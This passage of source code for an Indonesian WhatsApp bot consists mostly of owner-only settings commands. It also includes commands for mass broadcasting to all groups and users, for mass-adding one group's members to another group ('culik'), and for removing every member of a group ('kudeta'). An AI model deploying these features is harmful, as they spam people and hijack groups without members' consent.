const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { sticker: { url: media }})
await sleep(1000)
}
} else if (isQuotedAudio) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, audio: { url: media }, mimetype: "audio/mp4", ptt: true })
await sleep(1000)
}
} else if (isQuotedContact) {
let vcard = []
for (let z of m.quoted.contacts) {
vcard.push({ vcard: z.vcard }) 
}
for (let x of data) {
await sock.sendKontakV2(x, vcard, setQuoted) 
}
await sleep(1000)
} else if (!isAllMedia && !isQuotedAllMedia) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST GROUP  」\`\`\`\n\n${text}`
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, text: teks })
await sleep(1000)
}
}
setReply(mess.cmd.bcgc.text(data))
}
break
case "bcpc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
let data = Object.keys(db.data.users)
if (isImage || isQuotedImage) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, image: { url: media }, caption: teks, footer: copyrightnya })
await sleep(1000)
} 
} else if (isVideo || isQuotedVideo) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, video: { url: media }, caption: teks, footer: copyrightnya })
await sleep(1000)
}
} else if (isQuotedSticker) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { sticker: { url: media }})
await sleep(1000)
}
} else if (isQuotedAudio) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, audio: { url: media }, mimetype: "audio/mp4", ptt: true })
await sleep(1000)
}
} else if (isQuotedContact) {
let vcard = []
for (let z of m.quoted.contacts) {
vcard.push({ vcard: z.vcard }) 
}
for (let x of data) {
await sock.sendKontakV2(x, vcard, setQuoted) 
}
await sleep(1000)
} else if (!isAllMedia && !isQuotedAllMedia) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, text: teks })
await sleep(1000)
}
}
setReply(mess.cmd.bcpc.text(data))
}
break
case "getcase":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (m.isGroup && !isDevoloper) return setReply(mess.only.chats)
if (!text) return setReply(mess.query.cmd)
let nana = await getCase(text)
setReply(nana)
} catch {
setReply(mess.cmd.getcase.text) 
}
break
case "culik":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!text) return setReply(mess.query.link)
if (!text.includes("https://chat.whatsapp.com/")) return setReply(mess.cmd.culik.linkgc)
let member = participants.map((x) => x.id)
let ano = text.split("https://chat.whatsapp.com/")[1]
let nana = await sock.groupAcceptInvite(ano)
const groupMet = await sock.groupMetadata(nana).catch(e => {})
const parti = await groupMet.participants
const groupAdm = await parti.filter(v => v.admin !== null).map(v => v.id)
if (!groupAdm.includes(botNumber)) return onlyBadmin()
await sock.groupParticipantsUpdate(nana, member, "add")
setReply(mess.cmd.culik.success(groupName)) 
}
break
case "kudeta":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupOwner && x !== ownerNumber + "@s.whatsapp.net") {
sock.groupParticipantsUpdate(m.chat, [x], "remove")
await sleep(1000) 
}}}
break
case "ban":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
if (sock.cekBannedUser(Input.split("@")[0], banned)) return setReply(mess.cmd.ban.on)
let name = await sock.getName(Input) 
sock.addBanned(Input.split("@")[0], name, "", calender, banned)
setReply(mess.cmd.ban.success(Input)) 
}
break
case "unban":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
if (!sock.cekBannedUser(Input.split("@")[0], banned)) return setReply(mess.cmd.unban.on)
sock.unBanned(Input.split("@")[0], banned)
setReply(mess.cmd.unban.success(Input)) 
}
break
case "block":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
if (listblock.includes(Input)) return setReply(mess.cmd.block.on)
sock.updateBlockStatus(Input, "block")
setReply(mess.cmd.block.success(Input)) 
}
break
case "unblock":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
if (!listblock.includes(Input)) return setReply(mess.cmd.unblock.on)
sock.updateBlockStatus(Input, "unblock")
setReply(mess.cmd.unblock.success(Input)) 
}
break
case "blockcmd":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("blockcmd", dataId)) { sock.createDataId("blockcmd", dataId) }
if (sock.checkDataId("blockcmd", text, dataId)) return setReply(mess.cmd.blockcmd.on)
sock.addDataId("blockcmd", text, dataId)
setReply(mess.cmd.blockcmd.success(text))
}
break
case "unblockcmd":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("blockcmd", dataId)) { sock.createDataId("blockcmd", dataId) }
if (!sock.checkDataId("blockcmd", text, dataId)) return setReply(mess.cmd.unblockcmd.on)
sock.removeDataId("blockcmd", text, dataId)
setReply(mess.cmd.unblockcmd.success(text))
}
break
case "setppbot":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isImage && !args[0] || isQuotedImage && !args[0]) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const data = await sock.updateProfilePicture(botNumber, { url: media })
setReply(mess.success)
} else if (isImage && args[0] === "full" || isImage && args[0] === "/full" || isQuotedImage && args[0] === "full" || isQuotedImage && args[0] === "/full") {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const { img } = await generateProfilePicture(media)
await sock.query({ tag: "iq",attrs: { to: botNumber, type:"set", xmlns: "w:profile:picture"}, content: [{ tag: "picture", attrs: { type: "image" }, content: img }]})
setReply(mess.success)
} else setReply(mess.cmd.setppbot.text(prefix, command))
}
break
case "setbio":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
await sock.setStatus(text)
await setReply(mess.cmd.setbio.text(text))
}
break
case "setnomerowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.cmd.setnoowner.query)
if (args[0] == "08") return setReply(mess.cmd.setnoowner.number)
let number = text.replace(new RegExp("[()+-/ +/]", "gi"), "")
db.data.settings[botNumber].nomerowner = number
setReply(mess.cmd.setnoowner.text(number))
}
break
case "setnamaowner":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
db.data.settings[botNumber].namaowner = text
setReply(mess.cmd.setnamaowner.text(text))
break
case "setnamabot":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
db.data.settings[botNumber].namabot = text
setReply(mess.cmd.setnamabot.text(text))
break
case "setmenu":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (args[0] == "lokasi2" || args[0] == "location2") {
if (db.data.settings[botNumber].setmenu == "location2") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "location2"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "image" || args[0] == "img") {
if (db.data.settings[botNumber].setmenu == "image") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "image"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "lokasi" || args[0] == "location") {
if (db.data.settings[botNumber].setmenu == "location") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "location"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "image2" || args[0] == "img2") {
if (db.data.settings[botNumber].setmenu == "image2") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "image2"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "document") {
if (db.data.settings[botNumber].setmenu == "document") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "document"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "gif") {
if (db.data.settings[botNumber].setmenu == "gif") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "gif"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "video") {
if (db.data.settings[botNumber].setmenu == "video") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "video"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "gif2") {
if (db.data.settings[botNumber].setmenu == "gif2") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "gif2"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else if (args[0] == "video2") {
if (db.data.settings[botNumber].setmenu == "video2") return setReply(mess.on)
db.data.settings[botNumber].setmenu = "video2"
await sock.sendButMessage(m.chat, mess.cmd.setmenu.text(args[0]), copyrightnya, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], setQuoted)
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "DOCUMENT", rowId: `${prefix + command} document`, description: "TYPE DOCUMENT"},
{title: "LOCATION", rowId: `${prefix + command} location`, description: "TYPE LOCATION"},
{title: "IMAGE", rowId: `${prefix + command} image`, description: "TYPE IMAGE"},
{title: "GIF", rowId: `${prefix + command} gif`, description: "TYPE GIF"},
{title: "VIDEO", rowId: `${prefix + command} video`, description: "TYPE VIDEO"},
{title: "LOCATION 2", rowId: `${prefix + command} location2`, description: "TYPE LOCATION 2"},
{title: "IMAGE 2", rowId: `${prefix + command} image2`, description: "TYPE IMAGE 2"},
{title: "GIF 2", rowId: `${prefix + command} gif2`, description: "TYPE GIF 2"},
{title: "VIDEO 2", rowId: `${prefix + command} video2`, description: "TYPE VIDEO 2"},
]}]
const listMessage = { text: `SETTINGS MENU BOT`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })                    
} 
break
case "setdocument":
case "setdoc":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "zip") {
if (db.data.settings[botNumber].doctype == "zip") return setReply(mess.on)
db.data.settings[botNumber].doctype = "zip"
setReply(mess.cmd.setdoc.text(args[0]))
} else if (args[0] == "pdf") {
if (db.data.settings[botNumber].doctype == "pdf") return setReply(mess.on)
db.data.settings[botNumber].doctype = "pdf"
setReply(mess.cmd.setdoc.text(args[0]))
} else if (args[0] == "pptx") {
if (db.data.settings[botNumber].doctype == "pptx") return setReply(mess.on)
db.data.settings[botNumber].doctype = "pptx"
setReply(mess.cmd.setdoc.text(args[0]))
} else if (args[0] == "xlsx") {
if (db.data.settings[botNumber].doctype == "xlsx") return setReply(mess.on)
db.data.settings[botNumber].doctype = "xlsx"
setReply(mess.cmd.setdoc.text(args[0]))
} else if (args[0] == "docx") {
if (db.data.settings[botNumber].doctype == "docx") return setReply(mess.on)
db.data.settings[botNumber].doctype = "docx"
setReply(mess.cmd.setdoc.text(args[0]))
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "ZIP", rowId: `${prefix + command} zip`, description: "TYPE ZIP"},
{title: "PDF", rowId: `${prefix + command} pdf`, description: "TYPE PDF"},
{title: "PPTX", rowId: `${prefix + command} pptx`, description: "TYPE PPTX"},
{title: "XLSX", rowId: `${prefix + command} xlsx`, description: "TYPE XLSX"},
{title: "DOCX", rowId: `${prefix + command} docx`, description: "TYPE DOCX"},
]}]
const listMessage = { text: `SETTINGS DOCUMENT BOT`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })                    
} 
break
case "setquoted":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (args[0] == "ftoko") {
if (db.data.settings[botNumber].quoted == "ftoko") return setReply(mess.on)
db.data.settings[botNumber].quoted = "ftoko"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fkontak") {
if (db.data.settings[botNumber].quoted === "fkontak") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fkontak"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "ftext") {
if (db.data.settings[botNumber].quoted == "ftext") return setReply(mess.on)
db.data.settings[botNumber].quoted = "ftext"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "ftroli") {
if (db.data.settings[botNumber].quoted == "ftroli") return setReply(mess.on)
db.data.settings[botNumber].quoted = "ftroli"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "floc") {
if (db.data.settings[botNumber].quoted == "floc") return setReply(mess.on)
db.data.settings[botNumber].quoted = "floc"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fimage") {
if (db.data.settings[botNumber].quoted == "fimage") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fimage"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fdoc") {
if (db.data.settings[botNumber].quoted == "fdoc") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fdoc"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fvid") {
if (db.data.settings[botNumber].quoted == "fvid") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fvid"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fgif") {
if (db.data.settings[botNumber].quoted == "fgif") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fgif"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fvn") {
if (db.data.settings[botNumber].quoted == "fvn") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fvn"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fpay") {
if (db.data.settings[botNumber].quoted == "fpay") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fpay"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "fpoll") {
if (db.data.settings[botNumber].quoted == "fpoll") return setReply(mess.on)
db.data.settings[botNumber].quoted = "fpoll"
await setReply(mess.cmd.setquoted.text(args[0]))
} else if (args[0] == "m") {
if (db.data.settings[botNumber].quoted == "m") return setReply(mess.on)
db.data.settings[botNumber].quoted = "m"
await setReply(mess.cmd.setquoted.text(args[0]))
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "FTOKO", rowId: `${prefix + command} ftoko`, description: "TYPE FTOKO"},
{title: "FKONTAK", rowId: `${prefix + command} fkontak`, description: "TYPE FKONTAK"},
{title: "FTEXT", rowId: `${prefix + command} ftext`, description: "TYPE FTEXT"},
{title: "FTROLI", rowId: `${prefix + command} ftroli`, description: "TYPE FTROLI"},
{title: "FLOC", rowId: `${prefix + command} floc`, description: "TYPE FLOC"},
{title: "FIMAGE", rowId: `${prefix + command} fimage`, description: "TYPE FIMAGE"},
{title: "FDOC", rowId: `${prefix + command} fdoc`, description: "TYPE FDOC"},
{title: "FVID", rowId: `${prefix + command} fvid`, description: "TYPE FVID"},
{title: "FGIFT", rowId: `${prefix + command} fgif`, description: "TYPE FGIFT"},
{title: "FVN", rowId: `${prefix + command} fvn`, description: "TYPE FVN"},
{title: "FPAY", rowId: `${prefix + command} fpay`, description: "TYPE FPAY"},
{title: "FPOLL", rowId: `${prefix + command} fpoll`, description: "TYPE FPOLL"},
{title: "M", rowId: `${prefix + command} m`, description: "TYPE M"},
]}]
const listMessage = { text: `SETTINGS QUOTED BOT`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })                    
}
break
case "setcopyright":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
db.data.settings[botNumber].copyright = text
setReply(mess.cmd.setcopyright.text(text))
break
case "settextreply":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
db.data.settings[botNumber].textreply = encodeURI(text)
setReply(mess.cmd.settextreply.text(text))
break
case "setReply":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "web1") {
if (db.data.settings[botNumber].replytype == "web1") return setReply(mess.on)
db.data.settings[botNumber].replytype = "web1"
await setReply(mess.cmd.setReply.text(args[0]))
} else if (args[0] == "web2") {
if (db.data.settings[botNumber].replytype == "web2") return setReply(mess.on)
db.data.settings[botNumber].replytype = "web2"
await setReply(mess.cmd.setReply.text(args[0]))
} else if (args[0] == "web3") {
if (db.data.settings[botNumber].replytype == "web3") return setReply(mess.on)
db.data.settings[botNumber].replytype = "web3"
await setReply(mess.cmd.setReply.text(args[0]))
} else if (args[0] == "mess") {
if (db.data.settings[botNumber].replytype == "mess") return setReply(mess.on)
db.data.settings[botNumber].replytype = "mess"
await setReply(mess.cmd.setReply.text(args[0]))
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "WEB1", rowId: `${prefix + command} web1`, description: "TYPE WEB1"},
{title: "WEB2", rowId: `${prefix + command} web2`, description: "TYPE WEB2"},
{title: "WEB3", rowId: `${prefix + command} web3`, description: "TYPE WEB3"},
{title: "MESS", rowId: `${prefix + command} mess`, description: "TYPE MESS"},
]}]
const listMessage = { text: `SETTINGS REPLY BOT`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })                    
}
break
case "setwelcome":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (args[0] == "location") {
if (db.data.settings[botNumber].setwelcome == "location") return setReply(mess.on)
db.data.settings[botNumber].setwelcome = "location"
setReply(mess.cmd.setwelcome.text(args[0]))
} else if (args[0] == "image") {
if (db.data.settings[botNumber].setwelcome == "image") return setReply(mess.on)
db.data.settings[botNumber].setwelcome = "image"
setReply(mess.cmd.setwelcome.text(args[0]))
} else if (args[0] == "gif") {
if (db.data.settings[botNumber].setwelcome == "gif") return setReply(mess.on)
db.data.settings[botNumber].setwelcome = "gif"
setReply(mess.cmd.setwelcome.text(args[0]))
} else if (args[0] == "video") {
if (db.data.settings[botNumber].setwelcome == "video") return setReply(mess.on)
db.data.settings[botNumber].setwelcome = "video"
setReply(mess.cmd.setwelcome.text(args[0]))
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "LOCATION", rowId: `${prefix + command} location`, description: "TYPE LOCATION"},
{title: "IMAGE", rowId: `${prefix + command} image`, description: "TYPE IMAGE"},
{title: "GIF", rowId: `${prefix + command} gif`, description: "TYPE GIF"},
{title: "VIDEO", rowId: `${prefix + command} video`, description: "TYPE VIDEO"},
]}]
const listMessage = { text: `SETTINGS WELCOME BOT`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
break
case "setprefix":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "prefix") {
if (db.data.settings[botNumber].multi == "prefix") return setReply(mess.on)
db.data.settings[botNumber].multi = "prefix"
setReply(mess.cmd.setprefix.text(args[0]))
} else if (args[0] == "noprefix") {
if (db.data.settings[botNumber].multi == "noprefix") return setReply(mess.on)
db.data.settings[botNumber].multi = "noprefix"
setReply(mess.cmd.setprefix.text(args[0]))
} else if (args[0] == "allprefix") {
if (db.data.settings[botNumber].multi == "allprefix") return setReply(mess.on)
db.data.settings[botNumber].multi = "allprefix"
setReply(mess.cmd.setprefix.text(args[0]))
} else {
sock.sendButMessage(m.chat, `SETTINGS PREFIX BOT`, copyrightnya, [
{ buttonId: `${prefix + command} prefix`, buttonText: { displayText: "𝙿𝚁𝙴𝙵𝙸𝚇" }, type: 1 },
{ buttonId: `${prefix + command} noprefix`, buttonText: { displayText: "𝙽𝙾𝙿𝚁𝙴𝙵𝙸𝚇" }, type: 1 },
{ buttonId: `${prefix + command} allprefix`, buttonText: { displayText: "𝙰𝙻𝙻𝙿𝚁𝙴𝙵𝙸𝚇" }, type: 1 }], setQuoted)
}
break
case "setbahasa":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "indonesia") {
if (db.data.settings[botNumber].bahasa == "indonesia") return setReply(mess.on)
db.data.settings[botNumber].bahasa = "indonesia"
setReply("Berhasil mengubah bahasa ke indonesia")
} else if (args[0] == "english") {
if (db.data.settings[botNumber].bahasa == "english") return setReply(mess.on)
db.data.settings[botNumber].bahasa = "english"
setReply("Success changed the language to english")
} else {
sock.sendButMessage(m.chat, `SETTINGS BAHASA`, copyrightnya, [
{ buttonId: `${prefix + command} indonesia`, buttonText: { displayText: "𝙸𝙽𝙳𝙾𝙽𝙴𝚂𝙸𝙰" }, type: 1 },
{ buttonId: `${prefix + command} english`, buttonText: { displayText: "𝙴𝙽𝙶𝙻𝙸𝚂𝙷" }, type: 1 }], setQuoted)
}
break
case "auto":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (args[0] == "recording") {
if (db.data.settings[botNumber].auto == "recording") return setReply(mess.on)
db.data.settings[botNumber].auto = "recording"
setReply(mess.cmd.auto.text(args[0]))
} else if (args[0] == "typing") {
if (db.data.settings[botNumber].auto == "typing") return setReply(mess.on)
db.data.settings[botNumber].auto = "typing"
setReply(mess.cmd.auto.text(args[0]))
} else if (args[0] == "available") {
if (db.data.settings[botNumber].auto == "available") return setReply(mess.on)
db.data.settings[botNumber].auto = "available"
setReply(mess.cmd.auto.text(args[0]))
} else {
sock.sendButMessage(m.chat, `MODE ${command.toUpperCase()}`, copyrightnya, [
{ buttonId: `${prefix + command} recording`, buttonText: { displayText: "ʀᴇᴄᴏʀᴅɪɴɢ" }, type: 1 },
{ buttonId: `${prefix + command} typing`, buttonText: { displayText: "ᴛʏᴘɪɴɢ" }, type: 1 },
{ buttonId: `${prefix + command} available`, buttonText: { displayText: "ᴀᴠᴀɪʟᴀʙʟᴇ" }, type: 1 }], setQuoted)
}
break
case "autoblockcmd":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autoblockcmd == true) return setReply(mess.on)
db.data.settings[botNumber].autoblockcmd = true
setReply(mess.cmd.autoblockcmd.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autoblockcmd == false) return setReply(mess.off)
db.data.settings[botNumber].autoblockcmd = false
setReply(mess.cmd.autoblockcmd.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO BLOCK COMMAND`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autoreport":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autoreport == true) return setReply(mess.on)
db.data.settings[botNumber].autoreport = true
setReply(mess.cmd.autoreport.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autoreport == false) return setReply(mess.off)
db.data.settings[botNumber].autoreport = false
setReply(mess.cmd.autoreport.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO REPORT`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autobio":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autobio == true) return setReply(mess.on)
db.data.settings[botNumber].autobio = true
setReply(mess.cmd.autobio.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autobio == false) return setReply(mess.off)
db.data.settings[botNumber].autobio = false
setReply(mess.cmd.autobio.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO BIO`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autosticker":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autosticker == true) return setReply(mess.on)
db.data.settings[botNumber].autosticker = true
setReply(mess.cmd.autosticker.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autosticker == false) return setReply(mess.off)
db.data.settings[botNumber].autosticker = false
setReply(mess.cmd.autosticker.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO STICKER`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autorespon":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autorespon == true) return setReply(mess.on)
db.data.settings[botNumber].autorespon = true
setReply(mess.cmd.autorespon.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autorespon == false) return setReply(mess.off)
db.data.settings[botNumber].autorespon = false
setReply(mess.cmd.autorespon.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO RESPON`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autoread":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autoread == true) return setReply(mess.on)
db.data.settings[botNumber].autoread = true
setReply(mess.cmd.autoread.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autoread == false) return setReply(mess.off)
db.data.settings[botNumber].autoread = false
setReply(mess.cmd.autoread.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO READ`, copyrightnya, [
